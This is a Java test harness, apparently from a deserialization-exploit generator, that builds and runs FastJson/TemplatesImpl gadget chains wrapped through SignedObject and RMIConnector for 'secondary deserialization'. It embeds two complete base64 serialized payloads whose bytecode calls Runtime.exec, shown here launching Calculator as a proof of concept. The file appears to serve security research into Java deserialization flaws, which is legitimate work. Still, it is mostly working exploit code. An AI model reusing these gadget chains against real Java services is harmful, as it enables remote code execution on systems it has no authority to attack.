package com.ppp.secmgr;

import com.ppp.ObjectPayload;
import com.ppp.chain.WrapSerialization;
import com.ppp.chain.json.FastJson;
import com.ppp.enums.Save;
import com.ppp.sinks.SinksHelper;
import com.ppp.sinks.annotation.EnchantEnums;
import com.ppp.sinks.annotation.EnchantType;
import com.ppp.sinks.annotation.Sink;
import com.ppp.utils.Deserializer;
import com.ppp.utils.Reflections;
import com.ppp.utils.Serializer;
import com.ppp.utils.maker.CryptoUtils;

import java.io.ByteArrayInputStream;
import java.io.InputStream;

/**
 * @author Whoopsunix
 * <p>
 * 二次反序列化测试
 */
public class WrapRunner {
    public static void main(String[] args) throws Exception {
//        test1();
//        testNormal();
//        testSignedObject();
        testRMIConnector();
    }

    public static void test1(){
        try {
            String b64 = "rO0ABXNyABFqYXZhLnV0aWwuSGFzaE1hcAUH2sHDFmDRAwACRgAKbG9hZEZhY3RvckkACXRocmVzaG9sZHhwP0AAAAAAAAx3CAAAABAAAAABc3IAGmphdmEuc2VjdXJpdHkuU2lnbmVkT2JqZWN0Cf+9aCo81f8CAANbAAdjb250ZW50dAACW0JbAAlzaWduYXR1cmVxAH4AA0wADHRoZWFsZ29yaXRobXQAEkxqYXZhL2xhbmcvU3RyaW5nO3hwdXIAAltCrPMX+AYIVOACAAB4cAAABKms7QAFc3IAOmNvbS5zdW4ub3JnLmFwYWNoZS54YWxhbi5pbnRlcm5hbC54c2x0Yy50cmF4LlRlbXBsYXRlc0ltcGwJV0/BbqyrMwMABkkADV9pbmRlbnROdW1iZXJJAA5fdHJhbnNsZXRJbmRleFsACl9ieXRlY29kZXN0AANbW0JbAAZfY2xhc3N0ABJbTGphdmEvbGFuZy9DbGFzcztMAAVfbmFtZXQAEkxqYXZhL2xhbmcvU3RyaW5nO0wAEV9vdXRwdXRQcm9wZXJ0aWVzdAAWTGphdmEvdXRpbC9Qcm9wZXJ0aWVzO3hwAAAAAAAAAAB1cgADW1tCS/0ZFWdn2zcCAAB4cAAAAAJ1cgACW0Ks8xf4BghU4AIAAHhwAAABuMr+ur4AAAAxAB0BADZvcmcvYXBhY2hlL3ByZWRpY2F0ZWRzb3J0ZWRzZXQvc2V0L2NvbGxlY3Rpb25zL0NvbW1vbnMHAAEBABBqYXZhL2xhbmcvT2JqZWN0BwADAQAGPGluaXQ+AQADKClWAQAEQ29kZQwABQAGCgAEAAgBABFqYXZhL2xhbmcvUnVudGltZQcACgEACmdldFJ1bnRpbWUBABUoKUxqYXZhL2xhbmcvUnVudGltZTsMAAwADQoACwAOAQAWb3BlbiAtYSBDYWxjdWxhdG9yLmFwcAgAEAEABGV4ZWMBACcoTGphdmEvbGFuZy9TdHJpbmc7KUxqYXZhL2xhbmcvUHJvY2VzczsMABIAEwoACwAUAQAUU2VyaWFsVmVyc2lvblVJRERlbW8BAAFKBXHmae48bUcYAQANQ29uc3RhbnRWYWx1ZQEAClNvdXJjZUZpbGUBAA1SdW50aW1lRC5qYXZhACEAAgAEAAAAAQAaABYAFwABABoAAAACABgAAQABAAUABgABAAcAAAAaAAIAAQAAAA4qtwAJuAAPEhG2ABVXsQAAAAAAAQAbAAAAAgAcdXEAfgAIAAABtsr+ur4AAAAyABsKAAMAFQcAFwcAGAcAGQEAEHNlcmlhbFZlcnNpb25VSUQBAAFKAQANQ29uc3RhbnRWYWx1ZQVx5mnuPG1HGAEABjxpbml0PgEAAygpVgEABENvZGUBAA9MaW5lTnVtYmVyVGFibGUBABJMb2NhbFZhcmlhYmxlVGFibGUBAAR0aGlzAQADUFBQAQAMSW5uZXJDbGFzc2VzAQAbTGNvbS9wcHAvdXRpbHMvR2FkZ2V0cyRQUFA7AQAKU291cmNlRmlsZQEADEdhZGdldHMuamF2YQwACgALBwAaAQAZY29tL3BwcC91dGlscy9HYWRnZXRzJFBQUAEAEGphdmEvbGFuZy9PYmplY3QBABRqYXZhL2lvL1NlcmlhbGl6YWJsZQEAFWNvbS9wcHAvdXRpbHMvR2FkZ2V0cwAhAAIAAwABAAQAAQAaAAUABgABAAcAAAACAAgAAQABAAoACwABAAwAAAAvAAEAAQAAAAUqtwABsQAAAAIADQAAAAYAAQAAAC4ADgAAAAwAAQAAAAUADwASAAAAAgATAAAAAgAUABEAAAAKAAEAAgAWABAACXB0AAZhbnlTdHJwdwEAeHVxAH4ABgAAAC4wLAIUOBMjnQ9kXnUIsAufD39WizMVQiQCFDhCFJhmTG+lES8y3Tqtqbk7w/IWdAADRFNBc3IALmphdmF4Lm1hbmFnZW1lbnQuQmFkQXR0cmlidXRlVmFsdWVFeHBFeGNlcHRpb27U59qrYy1GQAIAAUwAA3ZhbHQAEkxqYXZhL2xhbmcvT2JqZWN0O3hyABNqYXZhLmxhbmcuRXhjZXB0aW9u0P0fPho7HMQCAAB4cgATamF2YS5sYW5nLlRocm93YWJsZdXGNSc5d7jLAwAETAAFY2F1c2V0ABVMamF2YS9sYW5nL1Rocm93YWJsZTtMAA1kZXRhaWxNZXNzYWdlcQB+AARbAApzdGFja1RyYWNldAAeW0xqYXZhL2xhbmcvU3RhY2tUcmFjZUVsZW1lbnQ7TAAUc3VwcHJlc3NlZEV4Y2VwdGlvbnN0ABBMamF2YS91dGlsL0xpc3Q7eHBxAH4AEXB1cgAeW0xqYXZhLmxhbmcuU3RhY2tUcmFjZUVsZW1lbnQ7AkYqPDz9IjkCAAB4cAAAAAVzcgAbamF2YS5sYW5nLlN0YWNrVHJhY2VFbGVtZW50YQnFmiY23YUCAARJAApsaW5lTnVtYmVyTAAOZGVjbGFyaW5nQ2xhc3NxAH4ABEwACGZpbGVOYW1lcQB+AARMAAptZXRob2ROYW1lcQB+AAR4cAAAADJ0ABtjb20ucHBwLmNoYWluLmpzb24uRmFzdEpzb250AA1GYXN0SnNvbi5qYXZhdAAIZ2V0Q2hhaW5zcQB+ABQAAAApcQB+ABZxAH4AF3QACWdldE9iamVjdHNxAH4AFAAAABN0ABxjb20ucHBwLk9iamVjdFBheWxvYWRCdWlsZGVydAAZT2JqZWN0UGF5bG9hZEJ1aWxkZXIuamF2YXQAB2J1aWxkZXJzcQB+ABQAAADydAASY29tLnBwcC5HYWRnZXRUZXN0dAAPR2FkZ2V0VGVzdC5qYXZhdAAUVGVtcGxhdGVzSW1wbFJ1bnRpbWVzcQB+ABQAAAAdcQB+ACBxAH4AIXQABG1haW5zcgAmamF2YS51dGlsLkNvbGxlY3Rpb25zJFVubW9kaWZpYWJsZUxpc3T8DyUxteyOEAIAAUwABGxpc3RxAH4AEHhyACxqYXZhLnV0aWwuQ29sbGVjdGlvbnMkVW5tb2RpZmlhYmxlQ29sbGVjdGlvbhlCAIDLXvceAgABTAABY3QAFkxqYXZhL3V0aWwvQ29sbGVjdGlvbjt4cHNyABNqYXZhLnV0aWwuQXJyYXlMaXN0eIHSHZnHYZ0DAAFJAARzaXpleHAAAAAAdwQAAAAAeHEAfgAqeHNyAB5jb20uYWxpYmFiYS5mYXN0anNvbi5KU09OQXJyYXkAAAAAAAAAAQIAAUwABGxpc3RxAH4AEHhwc3EAfgApAAAAAXcEAAAAAXEAfgAFeHg=";

            byte[] bytes = CryptoUtils.base64decoder(b64);

            InputStream bis = new ByteArrayInputStream(bytes);
            BlackInputStream ois = new BlackInputStream(bis);
            ois.readObject();
        }catch (Exception e){
            e.printStackTrace();
        }
    }

    /**
     * 正常
     */
    public static void testNormal() {
        try {
            final Class<? extends ObjectPayload> cls = FastJson.class;

            SinksHelper sinksHelper = new SinksHelper();
            sinksHelper.setOutput(String.valueOf(Save.Base64));
            String[] sinks = (String[]) Reflections.invokeMethod(cls.getAnnotation(Sink.class), "value", new Class[]{}, new Object[]{});
            sinksHelper.setSink(sinks[0]);

            sinksHelper.setEnchant(EnchantType.RUNTIME);
            sinksHelper.setCommand("open -a Calculator.app");

            // 生成 Gadget
            ObjectPayload<?> object = cls.newInstance();
            Object gadget = object.getObject(sinksHelper);

            byte[] bytes = Serializer.serialize(gadget);
            System.out.println(CryptoUtils.base64encoder(bytes));

            InputStream bis = new ByteArrayInputStream(bytes);
            BlackInputStream ois = new BlackInputStream(bis);
            ois.readObject();
        }catch (Exception e){
            e.printStackTrace();
        }
    }

    /**
     * 二次反序列化封装 SignedObject
     */
    public static void testSignedObject() {
        try {
            final Class<? extends ObjectPayload> cls = FastJson.class;

            SinksHelper sinksHelper = new SinksHelper();
            sinksHelper.setOutput(String.valueOf(Save.Base64));
            String[] sinks = (String[]) Reflections.invokeMethod(cls.getAnnotation(Sink.class), "value", new Class[]{}, new Object[]{});
            sinksHelper.setSink(sinks[0]);

            sinksHelper.setEnchant(EnchantType.RUNTIME);
            sinksHelper.setWrapSerialization(EnchantEnums.SignedObject);
            sinksHelper.setCommand("open -a Calculator.app");

            // 生成 Gadget
            ObjectPayload<?> object = cls.newInstance();
            Object gadget = object.getObject(sinksHelper);

            byte[] bytes = Serializer.serialize(gadget);
            System.out.println(CryptoUtils.base64encoder(bytes));

            InputStream bis = new ByteArrayInputStream(bytes);
            BlackInputStream ois = new BlackInputStream(bis);
            ois.readObject();
        }catch (Exception e){
            e.printStackTrace();
        }
    }

    /**
     * 二次反序列化封装 RMIConnector
     */
    public static void testRMIConnector() {
        try {
//            final Class<? extends ObjectPayload> cls = FastJson.class;
//
//            SinksHelper sinksHelper = new SinksHelper();
//            sinksHelper.setOutput(String.valueOf(Save.Base64));
//            String[] sinks = (String[]) Reflections.invokeMethod(cls.getAnnotation(Sink.class), "value", new Class[]{}, new Object[]{});
//            sinksHelper.setSink(sinks[0]);
//
//            sinksHelper.setEnchant(EnchantType.DEFAULT);
//            sinksHelper.setCommand("open -a Calculator.app");
//
//            // 生成原始 Gadget
//            ObjectPayload<?> object = cls.newInstance();
//            Object gadget = object.getObject(sinksHelper);
//
//            byte[] bytes = Serializer.serialize(gadget);
//            System.out.println(CryptoUtils.base64encoder(bytes));


            // open -a Calculator.app
            Object o = WrapSerialization.rmiConnector("rO0ABXNyABFqYXZhLnV0aWwuSGFzaE1hcAUH2sHDFmDRAwACRgAKbG9hZEZhY3RvckkACXRocmVzaG9sZHhwP0AAAAAAAAx3CAAAABAAAAABc3IAOmNvbS5zdW4ub3JnLmFwYWNoZS54YWxhbi5pbnRlcm5hbC54c2x0Yy50cmF4LlRlbXBsYXRlc0ltcGwJV0/BbqyrMwMABkkADV9pbmRlbnROdW1iZXJJAA5fdHJhbnNsZXRJbmRleFsACl9ieXRlY29kZXN0AANbW0JbAAZfY2xhc3N0ABJbTGphdmEvbGFuZy9DbGFzcztMAAVfbmFtZXQAEkxqYXZhL2xhbmcvU3RyaW5nO0wAEV9vdXRwdXRQcm9wZXJ0aWVzdAAWTGphdmEvdXRpbC9Qcm9wZXJ0aWVzO3hwAAAAAAAAAAB1cgADW1tCS/0ZFWdn2zcCAAB4cAAAAAJ1cgACW0Ks8xf4BghU4AIAAHhwAAABw8r+ur4AAAAyAB4BAB5vcmcvYXBhY2hlL2xvZ2ovbG9nZ2luZy9NYXJrZXIHAAEBABBqYXZhL2xhbmcvT2JqZWN0BwADAQAGPGluaXQ+AQADKClWAQAEQ29kZQwABQAGCgAEAAgBABFqYXZhL2xhbmcvUnVudGltZQcACgEACmdldFJ1bnRpbWUBABUoKUxqYXZhL2xhbmcvUnVudGltZTsMAAwADQoACwAOAQAWb3BlbiAtYSBDYWxjdWxhdG9yLmFwcAgAEAEABGV4ZWMBACcoTGphdmEvbGFuZy9TdHJpbmc7KUxqYXZhL2xhbmcvUHJvY2VzczsMABIAEwoACwAUAQAQc2VyaWFsVmVyc2lvblVJRAEAAUoFceZp7jxtRxgBAA1Db25zdGFudFZhbHVlAQAUU2VyaWFsVmVyc2lvblVJRERlbW8BAApTb3VyY2VGaWxlAQANUnVudGltZUQuamF2YQAhAAIABAAAAAIAGgAWABcAAQAaAAAAAgAYABoAGwAXAAEAGgAAAAIAGAABAAEABQAGAAEABwAAABoAAgABAAAADiq3AAm4AA8SEbYAFVexAAAAAAABABwAAAACAB11cQB+AAoAAAHOyv66vgAAADIAGwoAAwAVBwAXBwAYBwAZAQAQc2VyaWFsVmVyc2lvblVJRAEAAUoBAA1Db25zdGFudFZhbHVlBXHmae48bUcYAQAGPGluaXQ+AQADKClWAQAEQ29kZQEAD0xpbmVOdW1iZXJUYWJsZQEAEkxvY2FsVmFyaWFibGVUYWJsZQEABHRoaXMBAANQUFABAAxJbm5lckNsYXNzZXMBACFMY29tL3BwcC9zaW5rcy9UZW1wbGF0ZXNJbXBsJFBQUDsBAApTb3VyY2VGaWxlAQASVGVtcGxhdGVzSW1wbC5qYXZhDAAKAAsHABoBAB9jb20vcHBwL3NpbmtzL1RlbXBsYXRlc0ltcGwkUFBQAQAQamF2YS9sYW5nL09iamVjdAEAFGphdmEvaW8vU2VyaWFsaXphYmxlAQAbY29tL3BwcC9zaW5rcy9UZW1wbGF0ZXNJbXBsACEAAgADAAEABAABABoABQAGAAEABwAAAAIACAABAAEACgALAAEADAAAAC8AAQABAAAABSq3AAGxAAAAAgANAAAABgABAAABDQAOAAAADAABAAAABQAPABIAAAACABMAAAACABQAEQAAAAoAAQACABYAEAAJcHQABmFueVN0cnB3AQB4c3IALmphdmF4Lm1hbmFnZW1lbnQuQmFkQXR0cmlidXRlVmFsdWVFeHBFeGNlcHRpb27U59qrYy1GQAIAAUwAA3ZhbHQAEkxqYXZhL2xhbmcvT2JqZWN0O3hyABNqYXZhLmxhbmcuRXhjZXB0aW9u0P0fPho7HMQCAAB4cgATamF2YS5sYW5nLlRocm93YWJsZdXGNSc5d7jLAwAETAAFY2F1c2V0ABVMamF2YS9sYW5nL1Rocm93YWJsZTtMAA1kZXRhaWxNZXNzYWdlcQB+AAVbAApzdGFja1RyYWNldAAeW0xqYXZhL2xhbmcvU3RhY2tUcmFjZUVsZW1lbnQ7TAAUc3VwcHJlc3NlZEV4Y2VwdGlvbnN0ABBMamF2YS91dGlsL0xpc3Q7eHBxAH4AFXB1cgAeW0xqYXZhLmxhbmcuU3RhY2tUcmFjZUVsZW1lbnQ7AkYqPDz9IjkCAAB4cAAAAARzcgAbamF2YS5sYW5nLlN0YWNrVHJhY2VFbGVtZW50YQnFmiY23YUCAARJAApsaW5lTnVtYmVyTAAOZGVjbGFyaW5nQ2xhc3NxAH4ABUwACGZpbGVOYW1lcQB+AAVMAAptZXRob2ROYW1lcQB+AAV4cAAAADB0ABtjb20ucHBwLmNoYWluLmpzb24uRmFzdEpzb250AA1GYXN0SnNvbi5qYXZhdAAIZ2V0Q2hhaW5zcQB+ABgAAAAncQB+ABpxAH4AG3QACWdldE9iamVjdHNxAH4AGAAAAHx0ABljb20ucHBwLnNlY21nci5XcmFwUnVubmVydAAPV3JhcFJ1bm5lci5qYXZhdAAQdGVzdFJNSUNvbm5lY3RvcnNxAH4AGAAAAB1xAH4AIHEAfgAhdAAEbWFpbnNyACZqYXZhLnV0aWwuQ29sbGVjdGlvbnMkVW5tb2RpZmlhYmxlTGlzdPwPJTG17I4QAgABTAAEbGlzdHEAfgAUeHIALGphdmEudXRpbC5Db2xsZWN0aW9ucyRVbm1vZGlmaWFibGVDb2xsZWN0aW9uGUIAgMte9x4CAAFMAAFjdAAWTGphdmEvdXRpbC9Db2xsZWN0aW9uO3hwc3IAE2phdmEudXRpbC5BcnJheUxpc3R4gdIdmcdhnQMAAUkABHNpemV4cAAAAAB3BAAAAAB4cQB+ACp4c3IAHmNvbS5hbGliYWJhLmZhc3Rqc29uLkpTT05BcnJheQAAAAAAAAABAgABTAAEbGlzdHEAfgAUeHBzcQB+ACkAAAABdwQAAAABcQB+AAd4eA==");
            byte[] serialize = Serializer.serialize(o);
            Deserializer.deserialize(serialize);

        }catch (Exception e){
            e.printStackTrace();
        }
    }


}
